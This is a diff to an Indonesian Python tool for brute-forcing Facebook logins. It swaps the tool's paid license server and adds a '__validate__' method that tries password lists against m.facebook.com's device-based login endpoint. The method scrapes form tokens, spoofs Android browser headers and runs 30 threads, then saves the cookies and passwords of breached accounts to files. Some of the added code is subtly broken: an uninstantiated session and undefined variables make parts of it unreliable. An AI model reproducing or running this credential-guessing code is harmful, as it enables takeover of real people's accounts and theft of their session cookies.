@@ -158,19 +158,16 @@ def menu():
 def activate_licensi():
 	os.system("clear")
 	logo()
-	try:
-		key = open(".licensi", "r").read().strip()
-	except FileNotFoundError:
-		print("\x1b[1;97mKetik \x1b[1;92madmin\x1b[1;97m untuk mendapatkan lisensi script dari admin....terima kasih\n")
-		key = input("\x1b[1;96m[\x1b[1;97m>\x1b[1;96m]\x1b[1;97m licensi: ").lower()
+	print("\x1b[1;97mKetik \x1b[1;92madmin\x1b[1;97m untuk mendapatkan lisensi script dari admin....terima kasih\n")
+	key = input("\x1b[1;96m[\x1b[1;97m>\x1b[1;96m]\x1b[1;97m licensi: ").lower()
 	if "gets" in key:
-		os.system("xdg-open https://licensi.brutefb.my.id/register.php")
+		os.system("xdg-open https://fbkey.ratuerror.com/register/")
 		activate_licensi()
 	elif "admin" in key:
 		os.system("xdg-open https://wa.me/6287799183568?text=RATU%20COLMEXs....beli%20lisensi%20dooong")
 		activate_licensi()
 	else:
-		gets = requests.get("https://licensi.brutefb.my.id/api.php?key=%s&dev=%s" % (key.strip(), platform.platform())).json()
+		gets = requests.get("https://fbkey.ratuerror.com/check.php?key=%s&dev=%s" % (key.strip(), platform.platform())).json()
 		if "error" in gets["status"]:
 			exit(" [×] message: "+gets["msg"]+"\n\n")
 		elif "berlaku" in gets["status"]:
@@ -386,9 +383,6 @@ class crack:
 			print (' \x1b[1;96m[\x1b[1;97m2\x1b[1;96m] \x1b[1;97mMethode mbasic')
 			print (' \x1b[1;96m[\x1b[1;97m3\x1b[1;96m] \x1b[1;97mMethode mobile')
 			print (' \x1b[1;96m[\x1b[1;97m4\x1b[1;96m] \x1b[1;97mMethode api')
-			print (' \x1b[1;96m[\x1b[1;97m5\x1b[1;96m] \x1b[1;97mHeaders Validate')
-			print (' \x1b[1;96m[\x1b[1;97m6\x1b[1;96m] \x1b[1;97mHeaders Reguler')
-			print (' \x1b[1;96m[\x1b[1;97m7\x1b[1;96m] \x1b[1;97mHeaders Bussines')
 			print ('')
 			self.langsung()
 		else:
@@ -407,9 +401,6 @@ class crack:
 		print (' \x1b[1;96m[\x1b[1;97m2\x1b[1;96m] \x1b[1;97mMethode mbasic')
 		print (' \x1b[1;96m[\x1b[1;97m3\x1b[1;96m] \x1b[1;97mMethode mobile')
 		print (' \x1b[1;96m[\x1b[1;97m4\x1b[1;96m] \x1b[1;97mMethode api')
-		print (' \x1b[1;96m[\x1b[1;97m5\x1b[1;96m] \x1b[1;97mHeaders Validate')
-		print (' \x1b[1;96m[\x1b[1;97m6\x1b[1;96m] \x1b[1;97mHeaders Reguler')
-		print (' \x1b[1;96m[\x1b[1;97m7\x1b[1;96m] \x1b[1;97mHeaders Bussines')
 		men=input("\n \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
 		print (f"""
  \x1b[1;97m⚡ akun {H}OK {P}tersimpan di:{H} OK/{waktu}.txt{P}
@@ -429,12 +420,6 @@ class crack:
 					titid.submit(self.__romz__, uid, pwx,  "m.facebook.com")
 				elif men in['4']:
 					titid.submit(self.__romz__, uid, pwx,  "x.facebook.com")
-				elif men in['5','5']:
-					titid.submit(self.validate, uid, pwx)
-				elif men in['6','6']:
-					titid.submit(self.reg, uid, pwx)
-				elif men in['7','7']:
-					titid.submit(self.bussines, uid, pwx)
 				else:
 					exit("\n isi yang benar")
 					
@@ -449,7 +434,7 @@ class crack:
 		""")
 		with Romz_Xyz(max_workers=30) as titid:
 			for akun in id:
-				pwx = ['sayangku','sayang123']
+				pwx = []
 				uid,name = akun.split('<=>')[0],akun.split('<=>')[1].lower()
 				na = name.split(' ')[0]
 				if len(name)<6:
@@ -557,7 +542,62 @@ class crack:
 				time.sleep(3)
 			
 		loop+=1
-	
+
+
+ #--- methode 2
+	def __validate__(self, uid, pwx, url_log):
+		global ok,cp,loop 
+		komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
+		print (f"\r {komtol}• {P}{str(loop)}/{len(self.id)} - {H}OK:-{len(ok)} {K}CP:-{len(cp)}   ",end="")
+		ses = requests.Session
+		for pw in pwx:
+			try:
+				link = ses.get(f"https://m.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&next=%2Fcreatorstudio%2F%3Freference%3Dvisit_from_seo&refsrc=deprecated&_rdr").text
+				data = {
+					"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),
+					"jazoest": re.search('name="jazoest" value="(.*?)"', str(link)).group(1),
+					"uid": uid,"next": f"next=https://m.facebook.com/login/save-device/","flow": "login_no_pin","pass": pw}
+				headex = {"Host": URL,
+					"cache-control": "max-age=0",
+					"sec-ch-ua": f'"Android WebView";v="{str(rr(100,200))}", "Chromium";v="{str(rr(100,200))}", "Not.A/Brand";v="{str(rr(10,50))}"',
+					"sec-ch-ua-mobile": "?1",
+					"sec-ch-ua-platform": '"Android"',
+					"sec-ch-prefers-color-scheme": "dark",
+					"upgrade-insecure-requests": "1",
+					"origin": f"https://"+URL,
+					"content-type": "application/x-www-form-urlencoded",
+					"user-agent": self.UA(),
+					"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+					"x-requested-with": "mark.via.gp",
+					"sec-fetch-site": "same-origin",
+					"sec-fetch-mode": "navigate",
+					"sec-fetch-user": "?1",
+					"sec-fetch-dest": "document",
+					"referer": f"https://{URL}/login/device-based/password/?uid={uid}&flow=login_no_pin&next=%2Fcreatorstudio%2F%3Freference%3Dvisit_from_seo&refsrc=deprecated&_rdr",
+					"accept-encoding": "gzip, deflate, br, zstd",
+					"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}
+				post = ses.post(f"https://m.facebook.com/login/device-based/validate-password/?shbl=0",data=data, headers=headex, allow_redirects=False)
+				if "c_user" in ses.cookies.get_dict():
+					ok+=1
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					print(f'\r{P}└──{H} {user} ◊ {pw} \n{P} └─ {H}{kukis} \n{P} └─ {U}{self.UA()} \n ')
+					info = f"{user} ◊ {pw} ◊ {kukis}"
+					ok.append(f"{info}")
+					open(f'OK/{waktu}.txt', 'a').write(f" *--> {info}\n")
+					break
+				elif "checkpoint" in ses.cookies.get_dict():
+					cp+=1
+					print (f'\r{P}└── {K}{user} ◊ {pw}  \n{P} └─ {U}{self.UA()} \n ')
+					info = f'{user} ◊ {pw}'
+					cp.append(f'{info}')
+					open(f'CP/{waktu}.txt', 'a').write(f" *--> {info}\n")
+					break
+				else:
+					continue
+			except requests.exceptions.ConnectionError:
+				time.sleep(15)
+		loop+=1
+
 	# FINISH
 	def hasil(self,ok,cp):
 		if len(ok) != 0 or len(cp) != 0:
